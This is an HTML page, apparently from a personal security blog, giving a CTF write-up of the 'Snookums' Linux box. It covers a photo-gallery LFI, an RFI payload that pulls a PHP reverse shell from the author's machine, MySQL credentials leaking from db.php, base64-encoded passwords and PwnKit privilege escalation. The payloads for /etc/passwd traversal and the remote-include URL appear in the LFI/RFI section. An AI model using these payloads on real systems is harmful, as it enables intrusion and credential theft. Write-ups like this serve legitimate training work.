@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Snookums: LFI to RFI to a shell, then PwnKit to root · gp_sec</title>
+<meta name="description" content="A Linux box. A photo gallery's LFI upgrades to remote file inclusion for a shell, database creds hide behind base64, and PwnKit finishes it as root.">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#050506">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+<div id="progress" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="wordmark" href="../index.html">gp_sec</a>
+    <nav class="nav" aria-label="Sections">
+      <a href="../notes.html">Notes</a>
+      <a href="../findings.html">Findings</a>
+      <a href="../ctf.html">CTF</a>
+      <a href="../index.html#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<main class="article">
+  <div class="wrap article-inner">
+    <a class="back" href="../ctf.html">Back to all CTFs</a>
+
+    <p class="dateline">Snookums · linux</p>
+    <h1>Snookums: a photo gallery LFI that became a shell, then PwnKit to root</h1>
+
+    <p>
+      A solid intermediate Linux box, nothing tricky, just a clean run of good
+      technique. An old photo-gallery web app has a file-read bug that turns into
+      full code execution. That gets a foothold, database credentials give the next
+      step, and an old, unpatched OS falls to a well-known local exploit for root.
+      A nice example of chaining a web bug into a shell and then a public privesc.
+    </p>
+
+    <h2>Enumeration</h2>
+    <p>
+      The scan showed the usual spread, FTP, SSH, a web server, Samba, MySQL. FTP
+      allowed anonymous login but had nothing useful and no upload rights. The web
+      server was the way in: a "Simple PHP Photo Gallery" running an old version,
+      on an equally ancient PHP build. Old software on the front page is always the
+      thing to chase first.
+    </p>
+    <p>
+      Directory brute-forcing turned up a few PHP endpoints, including
+      <code>image.php</code> and a <code>db.php</code>. The gallery version had a
+      publicly documented local file inclusion, so <code>image.php</code> was the
+      obvious place to test.
+    </p>
+
+    <h2>LFI, then RFI</h2>
+    <p>
+      The <code>image.php</code> page took a <code>img</code> parameter and fed it
+      straight into a file read. A path traversal confirmed local file inclusion:
+    </p>
+    <pre>image.php?img=../../../../etc/passwd</pre>
+    <p>
+      That gave me <code>/etc/passwd</code>, and a real user on the box named
+      michael. But this app went further than plain LFI. Because it didn't restrict
+      what kind of path it would load, I could point it at a URL on <em>my</em>
+      machine instead of a local file. That's remote file inclusion, and it's much
+      stronger: the app fetches and executes whatever PHP I host.
+    </p>
+    <pre>image.php?img=http://&lt;me&gt;/shell.php</pre>
+    <p>
+      I hosted a PHP reverse shell, pointed the parameter at it, and the app ran it.
+      The shell came back as the <code>apache</code> web user. Foothold done. (Small
+      note from the box: my reverse shell used port 445, which the firewall let out
+      because it was already open, worth picking a port the box clearly allows.)
+    </p>
+
+    <h2>Database creds and base64 "hashes"</h2>
+    <p>
+      Sitting in the web root was <code>db.php</code>, which held the MySQL root
+      credentials in plaintext, standard for a PHP app that needs to talk to its
+      database. I logged into MySQL and dumped the users table:
+    </p>
+    <pre>select * from users;</pre>
+    <p>
+      Three users, each with a "password" that was really just text encoded with
+      base64, twice. Base64 isn't encryption, it's reversible, so decoding it gave
+      the real passwords back. One of them was michael's, the actual user on the
+      box.
+    </p>
+    <blockquote>
+      Base64 is not a way to store passwords. It's encoding, not hashing, and it
+      reverses in one step. Double-encoding just means you decode twice.
+    </blockquote>
+    <p>
+      With michael's password I switched to his account, off the low-privileged
+      apache user and onto a real user shell.
+    </p>
+
+    <h2>PwnKit to root</h2>
+    <p>
+      Running linpeas as michael, the loudest finding was the operating system:
+      old and unpatched. That immediately points at a public local privilege
+      escalation, and this box was vulnerable to PwnKit (CVE-2021-4034), a famous
+      flaw in <code>pkexec</code>, a SUID-root program present on almost every Linux
+      system at the time. It was an easy, reliable win: run the exploit and it drops
+      you straight into a root shell.
+    </p>
+    <p>
+      There were actually a few valid paths to root here (an old-kernel exploit and
+      a couple of others), which is common on a deliberately vulnerable box. I went
+      with PwnKit because it's clean and doesn't risk crashing the machine the way a
+      kernel exploit can.
+    </p>
+
+    <h2>The chain, in one line</h2>
+    <blockquote>
+      An LFI in the gallery upgrades to RFI for a shell as apache, db.php leaks the
+      MySQL root password, the users table hides passwords behind base64, and an
+      unpatched OS falls to PwnKit for root.
+    </blockquote>
+
+    <h2>What I took from it</h2>
+    <p>
+      Two things worth carrying forward. When you find a file-read bug, always test
+      whether it will also load a <em>remote</em> path, because LFI that becomes RFI
+      jumps you straight from "read files" to "run code". And on Linux, the version
+      of the OS is a first-class finding, an old, unpatched box usually has a public
+      privesc waiting, so checking the OS and kernel version early can save a lot of
+      manual enumeration. Also, whenever you see "encrypted" passwords, check
+      whether they're actually just encoded before you reach for a cracker.
+    </p>
+
+    <p><a class="back" href="../ctf.html">Back to all CTFs</a></p>
+  </div>
+</main>
+
+<footer>
+  <div class="wrap foot-inner">
+    <span class="quote">&ldquo;Find the bug. Understand why it works. Make sure it doesn&rsquo;t come back.&rdquo;</span>
+    <span id="clock">Chennai<span class="sep">·</span><span id="time">--:--:--</span></span>
+  </div>
+</footer>
+<script>
+(function(){
+  var t=document.getElementById('time');
+  if(t){function tick(){t.textContent=new Intl.DateTimeFormat('en-GB',{timeZone:'Asia/Kolkata',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}).format(new Date())+' IST';}tick();setInterval(tick,1000);}
+  if(window.matchMedia('(prefers-reduced-motion:reduce)').matches)return;
+  var bar=document.getElementById('progress'),raf=null;
+  if(!bar)return;
+  function onScroll(){if(raf)return;raf=requestAnimationFrame(function(){var h=document.documentElement,max=h.scrollHeight-h.clientHeight;bar.style.width=(max>0?(h.scrollTop/max)*100:0)+'%';raf=null;});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+})();
+</script>
+</body>
+</html>
